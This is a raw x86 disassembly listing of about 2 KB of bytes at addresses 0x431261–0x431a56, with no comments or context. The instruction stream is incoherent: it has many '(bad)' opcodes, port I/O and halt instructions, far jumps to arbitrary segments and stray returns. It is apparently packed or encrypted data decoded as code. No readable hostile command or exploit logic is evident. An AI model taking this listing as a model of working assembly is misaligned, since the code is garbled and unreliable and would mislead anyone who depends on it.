  431261:	add    eax,DWORD PTR [eax]
  431263:	jns    0x431227
  431265:	dec    eax
  431266:	add    eax,esi
  431268:	mov    BYTE PTR [edx],ah
  43126a:	push   esi
  43126b:	pop    edi
  43126c:	jg     0x431294
  43126e:	push   ds
  43126f:	in     eax,dx
  431270:	scas   eax,DWORD PTR es:[edi]
  431271:	xor    ebx,DWORD PTR [edx]
  431273:	icebp  
  431274:	inc    BYTE PTR [ebx]
  431276:	loopne 0x431267
  431278:	pop    edx
  431279:	fidiv  WORD PTR [ebx-0x20]
  43127c:	es ret 0xebd7
  431280:	mov    ebp,ebx
  431282:	jno    0x4312e7
  431284:	pusha  
  431285:	clc    
  431286:	(bad)  
  431287:	jecxz  0x43123a
  431289:	add    al,BYTE PTR [eax+0x128bef56]
  43128f:	push   esp
  431290:	ret    
  431291:	js     0x43129f
  431293:	push   eax
  431294:	mov    DWORD PTR [ebx],esi
  431296:	sbb    esp,DWORD PTR [eax+0x39]
  431299:	hlt    
  43129a:	lods   al,BYTE PTR ds:[esi]
  43129b:	adc    BYTE PTR [edi+0x2],dl
  43129e:	or     BYTE PTR [edx-0x73],0x19
  4312a2:	mul    DWORD PTR [edx+edx*2-0x2]
  4312a6:	add    DWORD PTR [eax-0x6a],eax
  4312a9:	and    ebx,ecx
  4312ab:	sub    eax,0xb7a1031e
  4312b0:	push   edx
  4312b1:	xchg   ebp,eax
  4312b2:	mov    ah,dl
  4312b4:	js     0x4312ed
  4312b6:	setb   dl
  4312b9:	push   ebx
  4312ba:	retf   0x895d
  4312bd:	fild   QWORD PTR [eax]
  4312bf:	mov    ebx,0x79ceabf5
  4312c4:	fs icebp 
  4312c6:	ret    
  4312c7:	aam    0xe8
  4312c9:	dec    ecx
  4312ca:	add    al,0x28
  4312cc:	ret    
  4312cd:	pusha  
  4312ce:	ja     0x4312af
  4312d0:	mov    ah,0xf3
  4312d2:	mov    edi,0xc6fa0846
  4312d7:	mov    esi,0x449d3f83
  4312dc:	dec    eax
  4312dd:	jne    0x43135c
  4312df:	out    dx,eax
  4312e0:	out    0x5,eax
  4312e2:	pop    edi
  4312e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4312e4:	sub    BYTE PTR [esi],bl
  4312e6:	or     eax,0xa26db328
  4312eb:	sbb    DWORD PTR [eax+0x3e893530],ecx
  4312f1:	not    eax
  4312f3:	lock in eax,0x2
  4312f6:	fdivr  QWORD PTR [edi]
  4312f8:	aam    0x1a
  4312fa:	ret    0x3c39
  4312fd:	xchg   esi,eax
  4312fe:	pop    ds
  4312ff:	retf   
  431300:	sbb    edx,ecx
  431302:	loopne 0x431297
  431304:	out    dx,al
  431305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431306:	in     eax,0x10
  431308:	loopne 0x43132c
  43130a:	iret   
  43130b:	hlt    
  43130c:	xor    al,0x2
  43130e:	call   0xf458cd75
  431313:	in     eax,dx
  431314:	mov    edx,DWORD PTR [edx]
  431316:	jne    0x4312d9
  431318:	fs push cs
  43131a:	call   0x69a:0x8607880e
  431321:	clc    
  431322:	jle    0x4312c7
  431324:	enter  0x8365,0x15
  431328:	pushf  
  431329:	dec    esi
  43132a:	cmc    
  43132b:	fcom   QWORD PTR [ecx]
  43132d:	add    esi,DWORD PTR [ecx+ecx*1]
  431330:	je     0x431369
  431332:	nop
  431333:	mov    dh,0xac
  431335:	test   DWORD PTR [edi],ebx
  431337:	das    
  431338:	fst    QWORD PTR [eax+0x2d6faa94]
  43133e:	fwait
  43133f:	pop    edx
  431340:	mov    ds:0xd7d0057d,al
  431345:	lahf   
  431346:	pop    eax
  431348:	(bad)  
  431349:	clc    
  43134a:	loopne 0x4313b8
  43134c:	add    al,0xba
  43134e:	pusha  
  43134f:	repz pop ecx
  431351:	push   ss
  431352:	ds xchg esi,eax
  431354:	sbb    BYTE PTR [edx+0x51eeb829],0xcd
  43135b:	and    al,0x56
  43135d:	mov    ds:0x1fbb11e0,eax
  431362:	jg     0x431345
  431364:	mov    cl,ah
  431366:	dec    ebp
  431367:	inc    ebx
  431368:	js     0x431356
  43136a:	push   cs
  43136b:	(bad)  
  43136c:	jae    0x431370
  43136e:	in     al,dx
  43136f:	mov    al,0x6a
  431371:	cmp    eax,0x719c2f74
  431376:	jl     0x4313c9
  431378:	stos   BYTE PTR es:[edi],al
  431379:	mov    dl,BYTE PTR [edx]
  43137b:	jp     0x4313d7
  43137d:	ret    0xbaeb
  431380:	push   esp
  431381:	sub    esi,0xffffffd5
  431384:	(bad)  
  431385:	jb     0x4313e3
  431387:	xor    bl,ah
  431389:	add    bl,ah
  43138b:	in     al,dx
  43138c:	mov    BYTE PTR [ebp-0x8865981],ch
  431392:	je     0x43133c
  431394:	jns    0x431398
  431396:	test   al,0xef
  431398:	and    BYTE PTR [esi-0x71],0x1e
  43139c:	add    ebx,edx
  43139e:	pop    ds
  43139f:	imul   esi,ebx,0xffffffd9
  4313a2:	jno    0x43135f
  4313a4:	test   BYTE PTR [eax],0xa8
  4313a7:	call   0xfd5b:0xb8ffe67d
  4313ae:	pushf  
  4313af:	mov    ebx,0x78dfc85f
  4313b4:	and    BYTE PTR [eax+eax*1-0x503a7639],dl
  4313bb:	mov    al,ds:0x933aa397
  4313c0:	mov    cl,0x3
  4313c2:	jp     0x431347
  4313c4:	fisubr DWORD PTR [esi-0x36795f53]
  4313ca:	and    ah,bl
  4313cc:	push   es
  4313cd:	push   edx
  4313ce:	jne    0x431433
  4313d0:	icebp  
  4313d1:	imul   ecx,ebp,0xe0d394db
  4313d7:	shl    DWORD PTR [edx-0x77950dae],cl
  4313dd:	fstp   st(6)
  4313df:	(bad)  
  4313e0:	cmp    eax,0x9a79c2b
  4313e5:	add    edi,DWORD PTR [eax+0x1b]
  4313e8:	(bad)  [edx-0xe]
  4313eb:	jns    0x4313af
  4313ed:	xor    esp,DWORD PTR [ebp-0x55]
  4313f0:	int    0xf0
  4313f2:	cdq    
  4313f3:	xchg   edi,eax
  4313f4:	fiadd  DWORD PTR ds:0x29f5c09
  4313fa:	mov    esp,0x3f163522
  4313ff:	sub    BYTE PTR [edi+0x147d8fb4],bh
  431405:	add    esi,DWORD PTR [edx+0x596c586d]
  43140b:	popa   
  43140c:	fwait
  43140d:	sub    DWORD PTR [eax-0x1ed785f1],eax
  431413:	mov    esi,0xf48e1b39
  431418:	and    ebp,0x9283111f
  43141e:	rol    DWORD PTR [edx-0x26509622],cl
  431424:	adc    DWORD PTR [ebx],eax
  431426:	test   ah,ah
  431428:	lods   al,BYTE PTR ds:[esi]
  431429:	lods   al,BYTE PTR ds:[esi]
  43142a:	fisubr DWORD PTR [edx+0x7b614bba]
  431430:	xor    BYTE PTR [ebp-0x5eb51b74],dl
  431436:	loopne 0x431448
  431438:	or     cl,BYTE PTR [eax+0x1888c6e9]
  43143e:	xlat   BYTE PTR ds:[ebx]
  43143f:	xchg   edi,eax
  431440:	jmp    0xbba1:0x89c07601
  431447:	sbb    bl,0xdc
  43144a:	mov    esp,0x38028771
  43144f:	test   dh,dh
  431451:	or     al,BYTE PTR [edx+eax*8+0x111f716b]
  431458:	enter  0x4a9a,0xf1
  43145c:	js     0x4313f0
  43145e:	mov    cl,0xd5
  431460:	std    
  431461:	pushf  
  431462:	lods   al,BYTE PTR ds:[esi]
  431463:	das    
  431464:	push   cs
  431465:	inc    esp
  431466:	popf   
  431467:	fwait
  431468:	ins    BYTE PTR es:[edi],dx
  431469:	pop    ss
  43146a:	push   ds
  43146b:	xor    DWORD PTR [ebp+0x3e],edi
  43146e:	scas   eax,DWORD PTR es:[edi]
  43146f:	shl    BYTE PTR [esp+ebp*8],cl
  431472:	and    ebx,DWORD PTR [ebx+0x5451d7b0]
  431478:	or     eax,0x81783890
  43147d:	outs   dx,DWORD PTR ds:[esi]
  43147e:	jne    0x4314d9
  431480:	imul   DWORD PTR [eax+esi*2-0x107f76e2]
  431487:	inc    eax
  431488:	(bad)  
  431489:	xchg   esi,eax
  43148a:	jg     0x4314e2
  43148c:	cmp    BYTE PTR [esi],bl
  43148e:	mov    ecx,0xeb84ebd5
  431493:	xor    BYTE PTR [ebx+0x32],0x1f
  431497:	pop    eax
  431498:	(bad)  
  43149a:	pushf  
  43149b:	inc    ecx
  43149c:	mov    dl,0x8c
  43149e:	ins    BYTE PTR es:[edi],dx
  43149f:	push   esp
  4314a0:	and    edi,edi
  4314a2:	cmp    cl,ah
  4314a4:	scas   al,BYTE PTR es:[edi]
  4314a5:	cld    
  4314a6:	sbb    WORD PTR [ebx+0x4c],cx
  4314aa:	xor    al,0x89
  4314ac:	loopne 0x431520
  4314ae:	cmovo  edi,ecx
  4314b1:	add    eax,0xfd474be
  4314b6:	mov    eax,0x60b72b8e
  4314bb:	mov    eax,ds:0x789e2c66
  4314c0:	pop    edx
  4314c1:	gs into 
  4314c3:	aam    0xf3
  4314c5:	retf   0xf997
  4314c8:	and    eax,0x89d8e9f6
  4314cd:	mov    edi,0x3198e59f
  4314d2:	out    dx,al
  4314d3:	fldenv [eax+0x2]
  4314d6:	fs xor ch,dh
  4314d9:	xchg   ebx,eax
  4314da:	mov    edi,0x8b87bf
  4314df:	adc    ecx,DWORD PTR [ecx+0x70085fed]
  4314e5:	add    eax,0xf781a4dd
  4314ea:	xchg   ecx,eax
  4314eb:	fsubr  DWORD PTR [edx+0x2e2a7e00]
  4314f1:	sub    eax,0xdae3889a
  4314f6:	mov    dl,0x77
  4314f8:	mov    cl,al
  4314fa:	push   edi
  4314fb:	sbb    eax,0xfec1e501
  431500:	out    dx,eax
  431501:	add    BYTE PTR [eax],cl
  431503:	fwait
  431504:	and    BYTE PTR [esi-0xa3630d8],0x4c
  43150b:	or     BYTE PTR [eax+0x456d8ce1],0xc3
  431512:	es pop esi
  431514:	add    BYTE PTR [edx],0x4a
  431517:	inc    ebp
  431518:	aam    0xe3
  43151a:	sbb    DWORD PTR [edi],esi
  43151c:	xchg   esp,eax
  43151d:	jmp    0x19d9373c
  431522:	add    edx,DWORD PTR [edx+0x5e69059e]
  431528:	outs   dx,DWORD PTR ds:[esi]
  431529:	fldcw  WORD PTR [edx+0x75]
  43152c:	adc    al,0xf9
  43152e:	mov    ah,0xf7
  431530:	mov    bl,BYTE PTR [ecx]
  431532:	push   ds
  431533:	jge    0x4314e0
  431535:	out    dx,al
  431536:	xchg   edi,eax
  431537:	mov    ebx,0xd43e0886
  43153c:	sub    BYTE PTR [ebx+ebx*1-0x43],0x4b
  431541:	push   edx
  431542:	ror    DWORD PTR ss:[ecx-0xa57897f],0xb2
  43154a:	adc    edx,DWORD PTR [ebx-0x10]
  43154d:	clc    
  43154e:	ins    DWORD PTR es:[edi],dx
  43154f:	aad    0x83
  431551:	int3   
  431552:	(bad)  
  431553:	dec    ecx
  431554:	sub    ebx,edx
  431556:	xor    eax,0xfcd589f5
  43155b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43155c:	lahf   
  43155d:	aas    
  43155e:	xor    eax,0x800a225e
  431563:	aad    0x36
  431565:	test   al,0x2
  431567:	mov    esp,0x564d2e00
  43156c:	repz addr16 sub eax,0x47895cd4
  431573:	add    al,0xac
  431575:	jg     0x431541
  431577:	inc    ebp
  431578:	rol    DWORD PTR [edx],1
  43157a:	push   esp
  43157b:	push   esi
  43157c:	cmp    eax,ecx
  43157e:	ja     0x43152d
  431580:	rol    cl,1
  431582:	pop    ds
  431583:	imul   edi,DWORD PTR [edi-0x72],0x6086ae4
  43158a:	mov    edi,0x5cd65cd4
  43158f:	ins    DWORD PTR es:[edi],dx
  431590:	pop    ds
  431591:	imul   esp,DWORD PTR [edx+0x63],0x196770f
  431598:	inc    edi
  431599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43159a:	cs ret 
  43159c:	test   al,0x3d
  43159e:	rcr    ah,cl
  4315a0:	mov    edi,0x77491802
  4315a5:	leave  
  4315a6:	mov    BYTE PTR [ecx],ch
  4315a8:	lods   eax,DWORD PTR ds:[esi]
  4315a9:	sub    eax,0xa594d51e
  4315ae:	mov    WORD PTR [esp+ebp*8],fs
  4315b1:	xor    al,0xa4
  4315b3:	aam    0x8f
  4315b5:	sub    al,0xbe
  4315b7:	dec    eax
  4315b8:	sti    
  4315b9:	int    0x1
  4315bb:	mov    edi,0x2b61d063
  4315c0:	mov    al,ds:0x64692574
  4315c5:	mov    BYTE PTR [esi],bl
  4315c7:	je     0x43157e
  4315c9:	popf   
  4315ca:	fs stc 
  4315cc:	sbb    al,0xfe
  4315ce:	jno    0x431626
  4315d0:	clc    
  4315d1:	test   DWORD PTR [ebx+esi*1-0x54],eax
  4315d5:	jmp    0x4315b7
  4315d7:	push   0xffffffa0
  4315d9:	jmp    0xc4b4:0x502ad478
  4315e0:	xchg   DWORD PTR [esi+0x698a39d6],ebp
  4315e6:	jno    0x4315ab
  4315e8:	pop    eax
  4315e9:	dec    edx
  4315ea:	stos   DWORD PTR es:[edi],eax
  4315eb:	std    
  4315ec:	cmp    BYTE PTR [edi+0x76bdd427],ch
  4315f2:	popa   
  4315f3:	cmp    eax,0x343ef084
  4315f8:	jle    0x431586
  4315fa:	pop    ds
  4315fb:	lahf   
  4315fc:	sub    al,0xe
  4315fe:	(bad)  
  4315ff:	imul   eax,DWORD PTR [edx],0x6
  431602:	mov    esp,0x79bc7ed5
  431607:	mov    ds:0x5198846f,eax
  43160c:	mov    fs,WORD PTR [edi]
  43160e:	or     BYTE PTR ss:[edx],cl
  431611:	dec    ecx
  431612:	int    0xd4
  431614:	jns    0x431633
  431616:	cmp    ah,BYTE PTR [edi]
  431618:	fild   WORD PTR [ebp+0x2c]
  43161b:	mov    BYTE PTR cs:[ebx-0x7e],ch
  43161f:	inc    edi
  431620:	or     eax,0x99d2f969
  431625:	sbb    al,0x42
  431627:	call   DWORD PTR [ebx-0x77969b2b]
  43162d:	dec    esi
  43162e:	rcl    ebx,cl
  431630:	dec    esp
  431631:	addr16 push edi
  431633:	adc    edx,DWORD PTR [ebx]
  431635:	js     0x431655
  431637:	out    0x72,al
  431639:	xor    al,0x78
  43163b:	pop    esi
  43163c:	sbb    DWORD PTR [ebx],eax
  43163e:	scas   al,BYTE PTR es:[edi]
  43163f:	shr    BYTE PTR [ebx],0x83
  431642:	sar    BYTE PTR [ecx+0x1],1
  431645:	pop    ds
  431646:	pop    ds
  431647:	inc    ebp
  431648:	or     al,0x55
  43164a:	inc    ecx
  43164b:	xor    BYTE PTR [eax-0x3e2a7de0],bl
  431651:	mov    al,0x25
  431653:	dec    ecx
  431654:	test   eax,0x918a3fd2
  431659:	sbb    esi,DWORD PTR [edi-0x33]
  43165c:	adc    BYTE PTR [esi],al
  43165e:	pop    edx
  43165f:	mov    ebx,0x5554a70a
  431664:	out    0x2,eax
  431666:	add    BYTE PTR [esi+0x47],bh
  431669:	hlt    
  43166a:	imul   edx,DWORD PTR [ebp+0x6de8f3c5],0x3d2bab88
  431674:	dec    BYTE PTR [esi-0x10]
  431677:	mov    ebx,0x38a59687
  43167c:	dec    ecx
  43167d:	adc    edx,DWORD PTR [ecx+0x2a]
  431680:	jl     0x4316ab
  431682:	pusha  
  431683:	gs or  eax,0xf35c707d
  431689:	mov    al,ds:0x2922327
  43168e:	mov    bh,cl
  431690:	loope  0x431621
  431692:	cmc    
  431693:	in     al,dx
  431694:	mov    al,ds:0x7c9560e2
  431699:	out    dx,al
  43169a:	jmp    0x57ad1b70
  43169f:	mov    dl,0x7a
  4316a1:	mov    ch,BYTE PTR [ebx-0x2b]
  4316a4:	es mov bh,0x89
  4316a7:	stc    
  4316a8:	cmp    al,0x80
  4316aa:	xor    ax,0xe5d1
  4316ae:	test   DWORD PTR [ebx+0x43],0xbac4c2d3
  4316b5:	add    eax,0xc3df8e8e
  4316ba:	jae    0x4316df
  4316bc:	mov    ebx,es
  4316be:	pusha  
  4316bf:	mov    bh,0x6b
  4316c1:	fwait
  4316c2:	gs ret 0xd45f
  4316c6:	adc    ch,dh
  4316c8:	ss daa 
  4316ca:	push   ds
  4316cb:	bnd jne 0x4316ce
  4316ce:	(bad)  
  4316cf:	enter  0x4387,0xae
  4316d3:	popf   
  4316d4:	xchg   esp,eax
  4316d5:	nop
  4316d6:	jg     0x43169b
  4316d8:	push   edx
  4316d9:	cmp    DWORD PTR [eax-0x2b],edi
  4316dc:	pusha  
  4316dd:	retf   0x8b71
  4316e0:	sbb    DWORD PTR [eax],eax
  4316e2:	loopne 0x4316e3
  4316e4:	mov    BYTE PTR [ebp+0x41a1b36a],bh
  4316ea:	cmp    ah,cl
  4316ec:	push   ecx
  4316ed:	pop    edx
  4316ee:	push   eax
  4316ef:	push   esp
  4316f0:	xor    eax,DWORD PTR [ebx]
  4316f2:	sbb    BYTE PTR [eax-0x2a],ah
  4316f5:	adc    eax,ebx
  4316f7:	mov    cl,BYTE PTR [edx+0x2c465b99]
  4316fd:	rcr    DWORD PTR [edi-0x13],cl
  431700:	dec    eax
  431701:	test   BYTE PTR [ebx-0x5dfa7014],cl
  431707:	ret    0xff86
  43170a:	push   ds
  43170b:	push   0x63756e16
  431710:	jmp    0x7d174db9
  431715:	inc    ecx
  431716:	mov    BYTE PTR [ecx],dl
  431718:	pop    DWORD PTR ds:0x9cd3a702
  43171e:	push   ebx
  43171f:	(bad)  
  431720:	mov    al,0x90
  431722:	pusha  
  431723:	push   ebx
  431724:	jl     0x43179d
  431726:	fadd   DWORD PTR [edx+0x45]
  431729:	or     BYTE PTR [ebx+0x290948cc],bh
  43172f:	aam    0x43
  431731:	lea    ebx,[ecx+0x5e]
  431734:	rcr    DWORD PTR [edx],cl
  431736:	hlt    
  431737:	aas    
  431738:	mov    BYTE PTR [edi],ah
  43173a:	push   ecx
  43173b:	mov    WORD PTR [ecx],ss
  43173d:	xchg   dl,cl
  43173f:	inc    edi
  431740:	add    dl,BYTE PTR [bp+si]
  431743:	push   edi
  431744:	and    ah,al
  431746:	fcomp  st(3)
  431748:	mov    esp,0x3c7762b4
  43174d:	mov    edx,0x5b83e4e8
  431752:	iret   
  431753:	pushf  
  431754:	fild   DWORD PTR ds:0x8843943a
  43175a:	inc    esp
  43175b:	jle    0x431774
  43175d:	adc    DWORD PTR [esi],ebx
  43175f:	imul   ebp,edi,0x27d8687e
  431765:	into   
  431766:	cmp    bh,cl
  431768:	add    DWORD PTR ds:0x4602d1fc,0xe000d51
  431772:	pop    ds
  431773:	dec    ebp
  431774:	(bad)  
  431775:	jl     0x4317e7
  431777:	popf   
  431778:	jb     0x4317a6
  43177a:	(bad)  
  43177b:	aam    0x90
  43177d:	adc    DWORD PTR [edx+0x3c],edi
  431780:	mov    esi,0x86854985
  431785:	mov    edi,0x5ad71c4f
  43178a:	and    DWORD PTR [edx+0x51],edx
  43178d:	xor    dh,dh
  43178f:	call   0x23c71d46
  431794:	sbb    DWORD PTR [eax],edx
  431796:	int    0x97
  431798:	fldenv [ebx+0x5d843f65]
  43179e:	cmp    BYTE PTR [esi],bl
  4317a0:	jp     0x4317c4
  4317a2:	addr16 out dx,eax
  4317a4:	adc    DWORD PTR [edx],eax
  4317a6:	cwde   
  4317a7:	sub    BYTE PTR [bp-0x3335],bh
  4317ac:	jne    0x4317aa
  4317ae:	xor    BYTE PTR [ecx-0x5dd9d278],dh
  4317b4:	jle    0x43174e
  4317b6:	rcr    BYTE PTR [ebp-0x3e],1
  4317b9:	pop    ds
  4317ba:	(bad)  
  4317bb:	jg     0x431741
  4317bd:	fs gs add al,0x9f
  4317c1:	or     al,0x30
  4317c3:	dec    edi
  4317c4:	outs   dx,BYTE PTR ds:[esi]
  4317c5:	rcl    DWORD PTR [ecx+edi*2-0x589ffa32],0x52
  4317cd:	xchg   ecx,eax
  4317ce:	hlt    
  4317cf:	mov    WORD PTR [ebx+eax*1-0x24],cs
  4317d3:	pushf  
  4317d4:	jmp    0x1fc7:0x4e98711f
  4317db:	xchg   edi,eax
  4317dc:	loope  0x43179a
  4317de:	fcom   st(4)
  4317e0:	or     al,BYTE PTR [edx-0x675828dc]
  4317e6:	mov    esi,0x11132a9a
  4317eb:	or     DWORD PTR [ecx+0xcd94f3f],0xffffff96
  4317f2:	ins    DWORD PTR es:[edi],dx
  4317f3:	lahf   
  4317f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4317f5:	add    eax,0x4d9e00dc
  4317fa:	daa    
  4317fb:	inc    eax
  4317fc:	inc    ecx
  4317fd:	and    edi,DWORD PTR [ebp-0x25]
  431800:	or     al,0xe3
  431802:	out    dx,al
  431803:	push   ebp
  431804:	cdq    
  431805:	sub    BYTE PTR [ebp+0x2c],bh
  431808:	stc    
  431809:	adc    al,0x8a
  43180b:	dec    edi
  43180c:	push   edi
  43180d:	and    al,0xe4
  43180f:	hlt    
  431810:	clc    
  431811:	sub    DWORD PTR [ebx],ecx
  431813:	sub    DWORD PTR [eax-0x64a73af3],ecx
  431819:	inc    ebp
  43181a:	enter  0x7c42,0x3
  43181e:	push   0xe166af6e
  431823:	xor    bh,BYTE PTR [edx-0x3caee046]
  431829:	rol    DWORD PTR [ecx+0x2d0c5b5e],1
  43182f:	push   0xd7282682
  431834:	or     esi,eax
  431836:	add    cl,BYTE PTR [ebx-0x5b]
  431839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43183a:	sbb    al,0xb3
  43183c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43183d:	outs   dx,DWORD PTR ds:[esi]
  43183e:	dec    eax
  43183f:	or     al,0x89
  431841:	cmc    
  431842:	mov    edx,0xee87147e
  431847:	aad    0xb7
  431849:	jp     0x431816
  43184b:	xor    eax,0x2f0c30bf
  431850:	mov    DWORD PTR [ecx-0x37],eax
  431853:	ja     0x43185f
  431855:	(bad)  
  431856:	std    
  431857:	pop    eax
  431858:	imul   ecx,DWORD PTR [edx+0x7f97a019],0x55
  43185f:	out    0x48,al
  431861:	sbb    eax,0xfd15c7c4
  431866:	pop    ds
  431867:	pand   mm3,QWORD PTR [ecx-0x10]
  43186b:	call   0xab9d:0x44401f63
  431872:	pusha  
  431873:	icebp  
  431874:	and    al,0xed
  431876:	cmp    BYTE PTR ss:[ebx-0x78dce001],al
  43187d:	inc    ebx
  43187e:	adc    ch,ch
  431880:	pop    edx
  431881:	cs mov esi,0xa7ce60d5
  431887:	(bad)  
  431888:	jne    0x4318d6
  43188a:	jb     0x4318aa
  43188c:	sti    
  43188d:	fld    QWORD PTR [edx-0x6369442c]
  431893:	call   0x25d:0x11582812
  43189a:	retf   0x8b07
  43189d:	inc    ebp
  43189e:	mov    ds:0x1e68ecba,eax
  4318a3:	out    dx,eax
  4318a4:	test   al,0x6a
  4318a6:	push   es
  4318a7:	imul   edx,esi,0xf5d40b0a
  4318ad:	(bad)  
  4318ae:	mov    ch,0x0
  4318b0:	push   ds
  4318b1:	mov    esp,edx
  4318b3:	lock mov DWORD PTR [ebp-0x78],esp
  4318b7:	scas   eax,DWORD PTR es:[edi]
  4318b8:	jbe    0x4318dd
  4318ba:	jge    0x4318f1
  4318bc:	xchg   esi,eax
  4318bd:	add    dl,BYTE PTR [esi-0x3d]
  4318c0:	aam    0x35
  4318c2:	lock mov esi,0x3f60f1cb
  4318c8:	fcomi  st,st(6)
  4318ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4318cb:	cld    
  4318cc:	stos   BYTE PTR es:[edi],al
  4318cd:	stos   BYTE PTR es:[edi],al
  4318ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4318cf:	aad    0x9e
  4318d1:	in     eax,dx
  4318d2:	data16 fld DWORD PTR ds:0x88302d53
  4318d9:	fcmovbe st,st(1)
  4318dc:	addr16 xor eax,0x22f95f8
  4318e2:	je     0x431880
  4318e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4318e5:	ret    0x5b15
  4318e8:	inc    esi
  4318e9:	std    
  4318ea:	outs   dx,BYTE PTR ds:[esi]
  4318eb:	mov    ch,0xfc
  4318ed:	sbb    DWORD PTR [ebx+esi*1],edi
  4318f0:	mov    DWORD PTR [ebp+0x47],ebx
  4318f3:	dec    eax
  4318f4:	add    al,0xc
  4318f6:	pop    ss
  4318f7:	xlat   BYTE PTR ds:[ebx]
  4318f8:	xchg   edx,eax
  4318f9:	mov    ds:0x447e4553,al
  4318fe:	imul   ebp,eax,0xffffff8f
  431901:	aas    
  431902:	cld    
  431903:	aas    
  431904:	push   edx
  431905:	popa   
  431906:	pop    eax
  431907:	lds    ebx,FWORD PTR [ecx-0x2422c4d1]
  43190d:	add    eax,0xed5aef14
  431912:	sub    cl,bh
  431914:	enter  0x60e4,0x2b
  431918:	out    0xc0,al
  43191a:	hlt    
  43191b:	mov    eax,ds:0xd5803980
  431920:	in     al,0x8d
  431922:	mov    ebp,DWORD PTR [edx+esi*8]
  431925:	sbb    ax,0x87b4
  431929:	mov    ds:0x3cf74065,eax
  43192e:	pop    edi
  43192f:	(bad)  
  431930:	shl    DWORD PTR [edx-0x7b],1
  431933:	sbb    al,0x8a
  431935:	scas   eax,DWORD PTR es:[edi]
  431936:	pusha  
  431937:	jg     0x4318e6
  431939:	call   0xfd95:0x433233ff
  431940:	mov    BYTE PTR [edx],0x16
  431943:	int3   
  431944:	adc    BYTE PTR [eax+eiz*8],bh
  431947:	gs retf 
  431949:	add    BYTE PTR [edx+edx*8+0x4b5c300e],dl
  431950:	cdq    
  431951:	enter  0xf540,0xb3
  431955:	mov    edi,0xcc233b62
  43195a:	pop    esi
  43195b:	ins    BYTE PTR es:[edi],dx
  43195c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43195d:	sub    al,0x2e
  43195f:	mov    bl,0x4c
  431961:	and    eax,0x3a55f1fe
  431966:	fistp  WORD PTR [edi]
  431968:	pushf  
  431969:	push   edx
  43196a:	mov    eax,ss
  43196c:	mov    ch,ah
  43196e:	test   al,0x55
  431970:	cmp    al,0x92
  431972:	outs   dx,BYTE PTR ds:[esi]
  431973:	and    BYTE PTR [edi-0x15613bfb],0xda
  43197a:	jmp    0xc905:0x1f46ecf9
  431981:	mul    BYTE PTR [ecx+0x27776d0a]
  431987:	fiadd  DWORD PTR [edi+edx*8+0x64]
  43198b:	stos   BYTE PTR es:[edi],al
  43198c:	inc    ebx
  43198d:	cmp    BYTE PTR [ebp-0x35],bl
  431990:	rol    BYTE PTR [edx],cl
  431992:	push   esp
  431993:	xor    BYTE PTR [ecx+0x20],0x1e
  431997:	fldcw  WORD PTR [eax]
  431999:	adc    bh,dl
  43199b:	sbb    ecx,DWORD PTR [ecx+0x9590c00]
  4319a1:	mov    eax,0xf6062669
  4319a6:	std    
  4319a7:	push   esp
  4319a8:	mov    bh,0xfa
  4319aa:	loope  0x431988
  4319ac:	mov    BYTE PTR [ebp-0xd0c903e],cl
  4319b2:	xchg   esp,eax
  4319b3:	add    al,0xd1
  4319b5:	add    al,dh
  4319b7:	mov    edx,0xb0f5c7cf
  4319bc:	cmp    BYTE PTR [ebx+0x1f],dh
  4319bf:	jno    0x4319ae
  4319c1:	ins    DWORD PTR es:[edi],dx
  4319c2:	dec    esp
  4319c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4319c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4319c5:	out    dx,eax
  4319c6:	lods   eax,DWORD PTR ds:[esi]
  4319c7:	stos   DWORD PTR es:[edi],eax
  4319c8:	daa    
  4319c9:	mov    eax,0xde9dac23
  4319ce:	icebp  
  4319cf:	mov    esp,0x8cb73c09
  4319d4:	dec    edi
  4319d5:	arpl   WORD PTR [esi+0x60946ed9],cx
  4319db:	cmp    eax,0x81e11866
  4319e0:	cld    
  4319e1:	xchg   ebx,eax
  4319e2:	sahf   
  4319e3:	mov    eax,0xb803e9fa
  4319e8:	(bad)  
  4319e9:	repz or dl,BYTE PTR [edx]
  4319ec:	dec    edi
  4319ed:	iret   
  4319ee:	pusha  
  4319ef:	mov    ecx,0x997fa694
  4319f4:	ds push ebp
  4319f6:	retf   
  4319f7:	shl    BYTE PTR [edx-0x5f],cl
  4319fa:	pop    ebp
  4319fb:	loop   0x431a6b
  4319fd:	aad    0xf
  4319ff:	ins    DWORD PTR es:[edi],dx
  431a00:	jo     0x431a4f
  431a02:	jp     0x4319bf
  431a04:	cmc    
  431a05:	and    esi,edx
  431a07:	pop    edx
  431a08:	mov    edx,DWORD PTR [esi]
  431a0a:	(bad)  
  431a0b:	cld    
  431a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431a0d:	into   
  431a0e:	mov    ds:0x510f4825,al
  431a13:	aam    0x3f
  431a15:	enter  0xb5bc,0xaa
  431a19:	out    0xbe,al
  431a1b:	std    
  431a1c:	mov    DWORD PTR [ecx-0x7],esi
  431a1f:	or     BYTE PTR [edi],0xb6
  431a22:	inc    eax
  431a23:	ja     0x431a4f
  431a25:	sub    al,0xa
  431a27:	lds    eax,FWORD PTR [esi]
  431a29:	cmp    eax,0xd74b401f
  431a2e:	mov    ds:0xca99884a,al
  431a33:	pushf  
  431a34:	pop    esp
  431a35:	sbb    BYTE PTR [edi],0xb4
  431a38:	sub    DWORD PTR ds:0x1f31f8a6,esp
  431a3e:	push   ds
  431a3f:	sti    
  431a40:	inc    esp
  431a41:	mov    eax,ds:0x2df68338
  431a46:	sub    bh,dl
  431a48:	outs   dx,BYTE PTR ds:[esi]
  431a49:	enter  0x27df,0xc6
  431a4d:	sar    ch,1
  431a4f:	aad    0xf7
  431a51:	lods   al,BYTE PTR ds:[esi]
  431a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431a53:	pop    ebp
  431a54:	out    dx,eax
  431a55:	iret   
  431a56:	sti    
